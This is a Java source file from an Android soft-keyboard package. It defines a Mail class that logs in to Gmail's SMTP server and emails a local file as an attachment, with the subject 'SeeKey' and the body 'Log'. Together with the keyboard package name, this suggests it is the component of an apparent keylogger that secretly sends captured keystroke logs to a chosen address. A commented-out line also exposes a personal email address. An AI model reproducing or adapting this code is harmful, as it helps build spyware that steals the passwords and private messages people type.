package com.exa.android.softkeyboard;

import java.util.Date;
import java.util.Properties;

import javax.activation.CommandMap;
import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.activation.MailcapCommandMap;
import javax.mail.BodyPart;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMessage.RecipientType;
import javax.mail.internet.MimeMultipart;
import javax.sql.DataSource;

 
 
public class Mail extends javax.mail.Authenticator { 
  private String _user ; 
  private String _pass; 
 
  //private String _to = "ezequiel.ribeiro@gmail.com";
 // private String _from = "ezequiel.ribeiro@gmail.com";  
 
  private String _to ;
  private String _from ;  
  
  private String _port; 
  private String _sport ; 
 
  private String _host = "smtp.gmail.com"; 
 
  private String assunto = "SeeKey"; 
  private String _body = "Log"; 
  
  private boolean _auth; 
   
  private boolean _debuggable; 
 
  private Multipart _multipart; 
 
 
  public void setMail() { 
	  
	   
    _port = "465"; // default smtp port 
    _sport = "465"; // default socketfactory port 
    
    _debuggable = false; // debug mode on or off - default off 
    _auth = true; // smtp authentication - default on 
 
    _multipart = new MimeMultipart(); 
 
    // There is something wrong with MailCap, javamail can not find a handler for the multipart/mixed part, so this bit needs to be added. 
    MailcapCommandMap mc = (MailcapCommandMap) CommandMap.getDefaultCommandMap(); 
    mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html"); 
    mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml"); 
    mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain"); 
    mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed"); 
    mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822"); 
    CommandMap.setDefaultCommandMap(mc); 
  } 
 
  public Mail(String user, String pass, String to)  { 
     
    
	  
    _user = user;
    _from = user;
    _pass = pass; 
    _to = to;    
    
    setMail();
   
  } 
 
  @SuppressWarnings("static-access")
public boolean send(String anexo, String texto) throws Exception, AddressException, MessagingException  { 
   
	   if(anexo.length() > 0)
	    	  addAttachment(anexo);
	  
	  Properties props = _setProperties(); 

	  if(!_user.equals("") && !_pass.equals("") && !_to.equals("") && !_from.equals(""))
	  { 
      //Session session = Session.getInstance(props, this); 
 
    Session session = Session.getInstance(props, new javax.mail.Authenticator() {
        protected PasswordAuthentication getPasswordAuthentication() {
            return new PasswordAuthentication(_user,_pass);
        }
    });
    
      
      MimeMessage simpleMessage = new MimeMessage(session); 
 
   // setup message body 
      BodyPart messageBodyPart = new MimeBodyPart(); 
      messageBodyPart.setText(_body); 
      _multipart.addBodyPart(messageBodyPart); 
 
   
    	  
      // Put parts in message 
      simpleMessage.setContent(_multipart); 
      
      Transport transport = session.getTransport("smtp");
      transport.connect();
      // send email 
          
          
      InternetAddress fromAddress = new InternetAddress(_from);
      InternetAddress toAddress = new InternetAddress(_to);
     
           
      simpleMessage.setFrom(fromAddress);
      simpleMessage.setRecipient(RecipientType.TO, toAddress);
      simpleMessage.setSubject(assunto);
      simpleMessage.setText(texto);
      simpleMessage.setSentDate(new Date());
      
      transport.sendMessage(simpleMessage,
      simpleMessage.getAllRecipients());
      
      return true; 
  } else { 
      return false; 
  } 
  } 
 
  private void addAttachment(String filename) throws Exception { 
   
	BodyPart messageBodyPart = new MimeBodyPart(); 
    FileDataSource source = new FileDataSource(filename); 
    messageBodyPart.setDataHandler(new DataHandler(source)); 
    messageBodyPart.setFileName(filename); 
      
    _multipart.addBodyPart(messageBodyPart); 
  } 
 
  @Override 
  public PasswordAuthentication getPasswordAuthentication() { 
    return new PasswordAuthentication(_user, _pass); 
  } 
 
  private Properties _setProperties() { 
    Properties props = new Properties(); 
 
    props.put("mail.smtp.host", _host); 
 
    if(_debuggable) { 
      props.put("mail.debug", "true"); 
    } 
 
    if(_auth) { 
      props.put("mail.smtp.auth", "true"); 
    } 
 
    props.put("mail.smtp.port", _port); 
    props.put("mail.smtp.socketFactory.port", _sport); 
    props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory"); 
    props.put("mail.smtp.socketFactory.fallback", "false"); 
    props.put("SSLContext.TLS",
            "org.apache.harmony.xnet.provider.jsse.SSLContextImpl");
    props.put("Alg.Alias.SSLContext.TLSv1", "TLS");
    props.put("KeyManagerFactory.X509",
            "org.apache.harmony.xnet.provider.jsse.KeyManagerFactoryImpl");
    props.put("TrustManagerFactory.X509",
            "org.apache.harmony.xnet.provider.jsse.TrustManagerFactoryImpl");
    
    
    return props; 
  } 
 
  // the getters and setters 
  public String getBody() { 
    return _body; 
  } 
 
  public void setBody(String _body) { 
    this._body = _body; 
  } 
 
  // more of the getters and setters ..

  
  
  
  

	}


